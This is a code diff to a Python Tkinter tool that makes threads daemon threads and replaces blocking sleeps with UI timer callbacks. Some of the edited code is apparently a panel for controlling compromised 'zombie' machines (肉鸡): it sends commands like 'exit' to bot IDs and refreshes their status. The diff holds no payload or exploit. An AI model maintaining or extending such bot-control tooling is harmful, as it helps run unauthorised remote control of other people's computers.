@@ -1549,7 +1549,7 @@ def create_ai_ask():
 
         # 创建并启动线程
         ai_name = get_ai_json_use_True_name()   # 获取use_page 为1的AI名称
-        request_thread = threading.Thread(target=ai_request_thread, args=(chat_box, question, ai_name))
+        request_thread = threading.Thread(target=ai_request_thread, args=(chat_box, question, ai_name), daemon=True)  # P1-4: 后台线程，避免非 daemon 线程拖住进程退出
         request_thread.start()
 
     # 设置文本框的标签样式
@@ -1773,8 +1773,8 @@ def create_ai_ask_two():
         # on_send(text_box, right_chat_box, "通义千问")    # 从text_box获取请求，将结果显示在right_chat_box
         # request_thread1 = threading.Thread(target=on_one_sent, args=(left_chat_box, "kimi_ai"))
         # request_thread2 = threading.Thread(target=on_one_sent, args=(right_chat_box, "通义千问"))
-        request_thread1 = threading.Thread(target=on_one_sent, args=(left_chat_box, left_ai))
-        request_thread2 = threading.Thread(target=on_one_sent, args=(right_chat_box, right_ai))
+        request_thread1 = threading.Thread(target=on_one_sent, args=(left_chat_box, left_ai), daemon=True)   # P1-4
+        request_thread2 = threading.Thread(target=on_one_sent, args=(right_chat_box, right_ai), daemon=True)  # P1-4
         request_thread1.start()
         request_thread2.start()
 
@@ -2099,11 +2099,14 @@ def rouji_panel():
         command_line.focus()  # 将焦点设置到命令行
 
     def delete_server_C(rouji_ID):
-        # 发送命令
-        client.send(f"{rouji_ID} #> exit".encode("UTF-8"))
-        # 清空命令行
-        time.sleep(1)
-        command_line.delete("1.0", END)
+        # 后台发送 exit，避免 time.sleep(1) 阻塞 UI；清空命令行回主线程执行
+        def _do():
+            try:
+                client.send(f"{rouji_ID} #> exit".encode("UTF-8"))
+            except Exception as e:
+                print(f"删除肉鸡命令发送失败: {e}")
+        threading.Thread(target=_do, daemon=True).start()
+        root.after(1000, lambda: command_line.delete("1.0", END))
 
     def handle_return(event):
         # 获取输入的命令
@@ -2324,11 +2327,8 @@ def rouji_panel():
 
             save_server_json(json_info) # 保存信息到本地
 
-            # 等待一下，确保连接稳定
-            time.sleep(0.5)
-
-            # 连接成功后立即开始自动刷新肉鸡信息
-            get_rouji_json_xinxi()
+            # 连接成功后开始自动刷新肉鸡信息（用 after 替代 time.sleep(0.5)，避免阻塞 UI）
+            root.after(500, get_rouji_json_xinxi)
         except:
             messagebox.showinfo("错误！","请正确填写信息！")
 
